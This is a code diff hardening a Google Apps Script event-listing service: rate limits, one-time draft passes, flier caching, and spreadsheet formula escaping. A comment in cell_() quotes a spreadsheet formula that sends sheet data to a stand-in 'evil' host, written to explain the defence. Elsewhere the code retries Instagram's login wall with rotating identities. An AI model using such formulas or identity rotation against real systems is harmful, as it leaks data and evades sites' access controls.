@@ -31,6 +31,8 @@ const CONFIG = {
   // Public form limits, so spam can't run up the Claude bill or flood the list.
   PUBLIC_PER_HOUR: 30,
   PUBLIC_PER_DAY: 120,
+  REMOVALS_PER_DAY: 10, // taken down right away; past this they wait for the owner
+  FLIER_LOADS_PER_DAY: 3000, // fliers fetched fresh from Drive (cached ones don't count)
   MAX_IMAGE_BYTES: 4 * 1024 * 1024,
   TYPES: [
     'Dance party', 'Drag', 'Burlesque', 'Music show', 'Workshop', 'Market',
@@ -293,6 +295,9 @@ function doPost(e) {
     return json_({ ok: false, message: 'Expected JSON.' });
   }
   if (!CONFIG.SUBMIT_TOKEN || body.token !== CONFIG.SUBMIT_TOKEN) return json_({ ok: false, message: 'Bad token.' });
+  if (body.imageBase64 && (typeof body.imageBase64 !== 'string' || body.imageBase64.length > CONFIG.MAX_IMAGE_BYTES * 1.37)) {
+    return json_({ ok: false, message: 'That image is too big.' });
+  }
   try {
     if (body.action === 'cleanup') return json_(cleanUp_());
     if (body.action === 'unskip') return json_(unskipOutsideWindow_());
@@ -349,6 +354,7 @@ function submitFromPage(form) {
       manual,
       interactive: true, // a person is waiting: offer "fill in what's missing" instead of skipping
       useTypedDetails: form.useTypedDetails === true, // completing a draft: no second AI pass
+      draftPass: typeof form.draftPass === 'string' ? form.draftPass.slice(0, 64) : '',
       credit: form.credit !== 'off',
       addedBy: clip_(form.addedBy, 60) || 'web form',
     });
@@ -365,7 +371,7 @@ function submitFromPage(form) {
 function requestRemoval(form) {
   if (!form || typeof form !== 'object' || form.website) return { ok: true, message: 'Thanks.' };
   if (!hasAccess_(form.invite) && !isEditor_(form.edit)) return { ok: false, message: 'This list is invite-only right now.' };
-  if (!underPublicLimit_()) return { ok: false, message: 'Too many requests right now. Try again in an hour.' };
+  if (!underLimit_('rm', 30, 120)) return { ok: false, message: 'Too many requests right now. Try again in an hour.' };
   const name = clip_(form.name, 200);
   const date = clip_(form.date, 10);
   const link = /^https?:\/\//.test(String(form.link || '')) ? cleanUrl_(form.link) : '';
@@ -375,16 +381,22 @@ function requestRemoval(form) {
   const match = rows.filter((r) => !isOffPage_(r.status) &&
     ((link && r.link === link) || (r.name === name && r.date === date)));
   if (!match.length) return { ok: false, message: "Couldn't find that listing. It may already be down." };
+  // A handful a day come down right away. Past that (someone working through the whole list),
+  // requests are still logged but wait for the owner.
+  const takeDown = underLimit_('rm-now', CONFIG.REMOVALS_PER_DAY, CONFIG.REMOVALS_PER_DAY);
   const lock = LockService.getScriptLock();
   lock.waitLock(30000);
   try {
-    match.forEach((r) => sheet.getRange(r.row, C.Status).setValue('removal requested'));
+    if (takeDown) match.forEach((r) => sheet.getRange(r.row, C.Status).setValue('removal requested'));
     const log = ss.getSheetByName(SHEETS.REMOVALS) || ensureSheet_(ss, SHEETS.REMOVALS, REMOVAL_COLS);
-    log.appendRow([new Date(), cell_(name), cell_(date), cell_(link), cell_(clip_(form.message, 500)), cell_(clip_(form.contact, 120)), '']);
+    log.appendRow([new Date(), cell_(name), cell_(date), cell_(link), cell_(clip_(form.message, 500)), cell_(clip_(form.contact, 120)),
+      takeDown ? '' : 'Still listed: waiting for you (lots of removal requests today). Set its Status to hidden to take it down.']);
   } finally {
     lock.releaseLock();
   }
-  return { ok: true, message: 'Done. The listing is down, and the list owner has your request.' };
+  return takeDown
+    ? { ok: true, message: 'Done. The listing is down, and the list owner has your request.' }
+    : { ok: true, message: "Thanks. The list owner has your request and will take it down soon." };
 }
 
 /** Data for the public page: live events from today onward. */
@@ -474,7 +486,8 @@ function processInboxRows_(sheet) {
 function processSubmission_(sub) {
   const url = sub.url ? cleanUrl_(sub.url) : '';
   const giveCredit = sub.credit !== false;
-  let author = sub.author || authorFromUrl_(sub.url || '');
+  // From the page, credit only comes from what the post itself shows, never from how the link is typed.
+  let author = sub.author || (sub.interactive ? null : authorFromUrl_(sub.url || ''));
   const manual = sub.manual || {};
   const seen = url ? knownLink_(url) : '';
   if (seen === 'listed') return { ok: true, status: 'duplicate', message: 'Already on the list 👻' };
@@ -499,21 +512,33 @@ function processSubmission_(sub) {
   } else if (sub.imageUrl) {
     image = fetchImage_(sub.imageUrl);
   }
+  const hasManual = manual.name && manual.date;
+  // Completing a draft from the page: the person typed the details, so use them as-is. Only for the
+  // same link and flier we just read (the pass proves it), so it can't be used to skip the reading step.
+  const fingerprint = draftFingerprint_(url, image);
+  const draft = sub.useTypedDetails && hasManual ? redeemDraft_(sub.draftPass, fingerprint) : null;
+  const typedOnly = Boolean(draft);
+  if (draft) author = author || draft.author;
+  if (draft && !image && draft.imageUrl) image = fetchImage_(draft.imageUrl); // the flier we found on the link
+  let linkImage = '';
+  const ask = (ev, message, flierReceived) => needsDetails_(ev, message, flierReceived, issueDraft_(fingerprint, author, linkImage));
+
   let blocked = false;
-  if (url && (!image || !caption || (giveCredit && !author))) {
+  if (url && !typedOnly && (!image || !caption || (giveCredit && !author))) {
     const preview = fetchPreview_(url);
     blocked = preview.blocked;
     author = author || preview.author;
     caption = caption || preview.description;
     title = preview.title;
-    if (!image && preview.image) { image = fetchImage_(preview.image); firstImageOnly = Boolean(image); }
+    if (!image && preview.image) {
+      image = fetchImage_(preview.image);
+      firstImageOnly = Boolean(image);
+      if (image) linkImage = preview.image;
+    }
   }
 
-  const hasManual = manual.name && manual.date;
-  // Completing a draft from the page: the person typed the details, so use them as-is.
-  const typedOnly = sub.useTypedDetails && hasManual;
   if (sub.interactive && !typedOnly && !image && !caption && !hasManual) {
-    return needsDetails_({}, blocked
+    return ask({}, blocked
       ? "Instagram didn't let us see this post just now. Add the details below, or try again in a minute."
       : "We couldn't open that link. Add the details below, or upload a screenshot of the flier.", false);
   }
@@ -536,7 +561,7 @@ function processSubmission_(sub) {
   // Safety net: a named event with a real date counts, even if the model said "not an event".
   const datedEvent = (extracted.events || []).some((ev) => ev.name && /^\d{4}-\d{2}-\d{2}$/.test(ev.date));
   if (sub.interactive && (!(extracted.is_event || datedEvent) || !extracted.events.length)) {
-    return needsDetails_((extracted.events || [])[0] || {}, "We couldn't find all the event details in this post. Fill in what's missing:" + slideTip(), Boolean(image));
+    return ask((extracted.events || [])[0] || {}, "We couldn't find all the event details in this post. Fill in what's missing:" + slideTip(), Boolean(image));
   }
   if (!(extracted.is_event || datedEvent) || !extracted.events.length) {
     logSkipped_(url, 'Not an event', '', '', addedBy, '');
@@ -559,7 +584,7 @@ function processSubmission_(sub) {
 
   if (sub.interactive && !kept.length && outside.length) {
     const ev = outside[0];
-    return needsDetails_(ev, !ev.date
+    return ask(ev, !ev.date
       ? "We couldn't find the date. Fill in what's missing:" + slideTip()
       : `The date we read is ${prettyDate_(ev.date)}, which is outside this list's season. If that's wrong, fix it below:`, Boolean(image));
   }
@@ -902,15 +927,17 @@ function isLoginWall_(html) {
 }
 
 function fetchPreview_(url) {
-  const out = { title: '', description: '', image: '', author: authorFromUrl_(url), blocked: false };
+  const out = { title: '', description: '', image: '', author: null, blocked: false };
   let html = fetchHtml_(url, true, 0);
-  // The login page comes and goes, so try a few times (rotating identities) before giving up.
-  for (let tries = 1; html && isLoginWall_(html) && tries < 6; tries++) {
+  // Instagram's login page comes and goes, so try a few times (rotating identities) before giving up.
+  const instagram = /^https:\/\/(www\.)?instagram\.com\//.test(url);
+  for (let tries = 1; instagram && html && isLoginWall_(html) && tries < 6; tries++) {
     Utilities.sleep(700 * tries);
     html = fetchHtml_(url, true, tries);
   }
-  if (html && isLoginWall_(html)) { out.blocked = true; return out; }
+  if (instagram && html && isLoginWall_(html)) { out.blocked = true; return out; }
   if (!html) return out;
+  out.author = authorFromUrl_(url);
   out.title = meta_(html, 'og:title');
   out.description = meta_(html, 'og:description') || meta_(html, 'description');
   out.image = meta_(html, 'og:image');
@@ -961,7 +988,11 @@ function fetchHtml_(url, asCrawler, attempt) {
         'Accept-Language': 'en-US,en;q=0.9',
       },
     });
-    return res.getResponseCode() < 400 ? res.getContentText() : '';
+    if (res.getResponseCode() >= 400) return '';
+    // Meta tags live in <head>; don't run the parsers over a huge (or hostile) page.
+    const html = res.getContentText().slice(0, 1024 * 1024);
+    const end = html.search(/<\/head>/i);
+    return end > 0 ? html.slice(0, end) : html;
   } catch (err) {
     console.warn('fetch failed', url, err);
     return '';
@@ -984,6 +1015,8 @@ function decodeEntities_(s) {
 }
 
 function fetchImage_(url) {
+  // Instagram's login page offers its own logo (from /rsrc.php/) as the image; that's never a flier.
+  if (/\/rsrc\.php\//.test(String(url))) return null;
   try {
     const res = UrlFetchApp.fetch(url, { muteHttpExceptions: true, followRedirects: true });
     if (res.getResponseCode() >= 400) return null;
@@ -1023,15 +1056,17 @@ function getFlier(id, size, invite, edit) {
   if (!hasAccess_(invite) && !isEditor_(edit)) return '';
   if (typeof id !== 'string' || !/^[A-Za-z0-9_-]{20,80}$/.test(id)) return '';
   const px = [480, 1400].includes(size) ? size : 480;
-  const cache = CacheService.getScriptCache();
-  const key = 'fl-' + id + '-' + px;
-  const hit = cache.get(key);
-  if (hit) return hit;
+  // Checked before the cache, so a flier stops loading the moment its listing comes down.
   const sheet = getSpreadsheet_().getSheetByName(SHEETS.EVENTS);
   const last = sheet.getLastRow();
   if (last < 2) return '';
   const rows = sheet.getRange(2, 1, last - 1, EVENT_COLS.length).getValues();
   if (!rows.some((r) => String(r[C['Flier ID'] - 1]) === id && !isOffPage_(r[C.Status - 1]))) return '';
+  const key = 'fl-' + id + '-' + px;
+  const hit = cachedFlier_(key);
+  if (hit) return hit;
+  // Each fresh load uses Google's daily allowance of outside requests, which adding events needs too.
+  if (!underFlierLoadLimit_()) return '';
   try {
     const auth = { headers: { Authorization: 'Bearer ' + ScriptApp.getOAuthToken() }, muteHttpExceptions: true };
     const meta = JSON.parse(UrlFetchApp.fetch('https://www.googleapis.com/drive/v3/files/' + id + '?fields=thumbnailLink', auth).getContentText());
@@ -1041,12 +1076,45 @@ function getFlier(id, size, invite, edit) {
     const img = validImage_(res.getBlob(), 5 * 1024 * 1024);
     if (!img) return '';
     const url = 'data:' + img.getContentType() + ';base64,' + Utilities.base64Encode(img.getBytes());
-    if (url.length < 95000) cache.put(key, url, 6 * 3600);
+    cacheFlier_(key, url);
     return url;
   } catch (err) {
     console.warn('getFlier', id, err);
     return '';
   }
+}
+
+// Cache values max out at 100 KB, so bigger fliers are stored in pieces.
+const FLIER_PIECE = 90000;
+
+function cacheFlier_(key, url) {
+  const parts = {};
+  const count = Math.ceil(url.length / FLIER_PIECE);
+  if (count > 20) return;
+  for (let i = 0; i < count; i++) parts[key + '-' + i] = url.slice(i * FLIER_PIECE, (i + 1) * FLIER_PIECE);
+  parts[key] = 'parts:' + count;
+  try { CacheService.getScriptCache().putAll(parts, 6 * 3600); } catch (err) { console.warn('cacheFlier', err); }
+}
+
+function cachedFlier_(key) {
+  const cache = CacheService.getScriptCache();
+  const head = cache.get(key);
+  if (!head) return '';
+  const count = Number((head.match(/^parts:(\d+)$/) || [])[1]);
+  if (!count) return head.startsWith('data:') ? head : '';
+  const keys = Array.from({ length: count }, (_, i) => key + '-' + i);
+  const got = cache.getAll(keys);
+  return keys.every((k) => got[k]) ? keys.map((k) => got[k]).join('') : '';
+}
+
+/** Approximate on purpose (no lock): a page opening loads many fliers at once. */
+function underFlierLoadLimit_() {
+  const cache = CacheService.getScriptCache();
+  const key = 'fl-loads-' + Utilities.formatDate(new Date(), CONFIG.TZ, 'yyyyMMdd');
+  const n = Number(cache.get(key) || 0);
+  if (n >= CONFIG.FLIER_LOADS_PER_DAY) return false;
+  cache.put(key, String(n + 1), 26 * 3600);
+  return true;
 }
 
 /** Turns off link sharing on every stored flier and points the sheet at private links. Part of Tidy up. */
@@ -1066,10 +1134,6 @@ function privatizeFliers_(sheet) {
     sheet.getRange(2, C.Flier, last - 1, 1).setFormulas(ids.map(([id]) => [id ? flierCell_(id) : '']));
   }
   return changed;
-}
-
-function thumbUrl_(id) {
-  return `https://drive.google.com/thumbnail?id=${id}&sz=w800`;
 }
 
 // ---------------------------------------------------------------- Claude
@@ -1173,7 +1237,7 @@ function extractEvents_({ image, caption, title, url, note, postedAt, manual }) 
  * For the page: what we could read, so the person only fills in the gaps.
  * Nothing is saved yet; the page sends the completed details back with the same link/flier.
  */
-function needsDetails_(ev, message, flierReceived) {
+function needsDetails_(ev, message, flierReceived, pass) {
   const draft = {
     name: String(ev.name || ''), date: /^\d{4}-\d{2}-\d{2}$/.test(String(ev.date || '')) ? ev.date : '',
     time: [validTime_(ev.start_time), validTime_(ev.end_time)].filter(Boolean).map(prettyTime_).join(' – '),
@@ -1183,7 +1247,31 @@ function needsDetails_(ev, message, flierReceived) {
     spooky: ev.spooky !== false,
   };
   const missing = ['name', 'date'].filter((k) => !draft[k]);
-  return { ok: false, status: 'needs-details', message, draft, missing, flierReceived };
+  return { ok: false, status: 'needs-details', message, draft, missing, flierReceived, pass };
+}
+
+/** Which link + flier a draft belongs to. */
+function draftFingerprint_(url, image) {
+  const bytes = image ? Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, image.getBytes()) : [];
+  return Utilities.base64Encode(Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, url + '|' + Utilities.base64Encode(bytes)));
+}
+
+/** A one-time pass for finishing this draft within the hour (remembers the credit and link flier we found too). */
+function issueDraft_(fingerprint, author, imageUrl) {
+  const pass = Utilities.getUuid();
+  CacheService.getScriptCache().put('draft-' + pass, JSON.stringify({ fingerprint, author: author || null, imageUrl: imageUrl || '' }), 3600);
+  return pass;
+}
+
+function redeemDraft_(pass, fingerprint) {
+  if (typeof pass !== 'string' || !/^[0-9a-f-]{36}$/.test(pass)) return null;
+  const cache = CacheService.getScriptCache();
+  const saved = cache.get('draft-' + pass);
+  if (!saved) return null;
+  const draft = JSON.parse(saved);
+  if (draft.fingerprint !== fingerprint) return null;
+  cache.remove('draft-' + pass);
+  return draft;
 }
 
 function manualToEvent_(m) {
@@ -1427,7 +1515,7 @@ function ownerOnly_() {
 /** Stops text from becoming a formula (e.g. =IMPORTDATA("https://evil?"&A1) leaking the sheet). */
 function cell_(v) {
   const text = v == null ? '' : String(v);
-  return /^[=+\-@\t\r]/.test(text) ? "'" + text : text;
+  return /^[\s\u0000-\u001f]*[=+\-@]/.test(text) ? "'" + text : text;
 }
 
 /** Accepts only real JPEG/PNG/GIF/WebP bytes under the size cap; returns a blob typed by its contents. */
@@ -1447,16 +1535,20 @@ function validImage_(blob, maxBytes) {
 
 /** Fixed-window counters for the public form. */
 function underPublicLimit_() {
+  return underLimit_('pub', CONFIG.PUBLIC_PER_HOUR, CONFIG.PUBLIC_PER_DAY);
+}
+
+function underLimit_(name, perHour, perDay) {
   const cache = CacheService.getScriptCache();
   const props = PropertiesService.getScriptProperties();
-  const hourKey = 'pub-h-' + Utilities.formatDate(new Date(), CONFIG.TZ, 'yyyyMMddHH');
-  const dayKey = 'pub-d-' + Utilities.formatDate(new Date(), CONFIG.TZ, 'yyyyMMdd');
+  const hourKey = name + '-h-' + Utilities.formatDate(new Date(), CONFIG.TZ, 'yyyyMMddHH');
+  const dayKey = name + '-d-' + Utilities.formatDate(new Date(), CONFIG.TZ, 'yyyyMMdd');
   const lock = LockService.getScriptLock();
   lock.waitLock(10000);
   try {
     const hour = Number(cache.get(hourKey) || 0);
     const day = Number(props.getProperty(dayKey) || 0);
-    if (hour >= CONFIG.PUBLIC_PER_HOUR || day >= CONFIG.PUBLIC_PER_DAY) return false;
+    if (hour >= perHour || day >= perDay) return false;
     cache.put(hourKey, String(hour + 1), 3600);
     props.setProperty(dayKey, String(day + 1));
     return true;
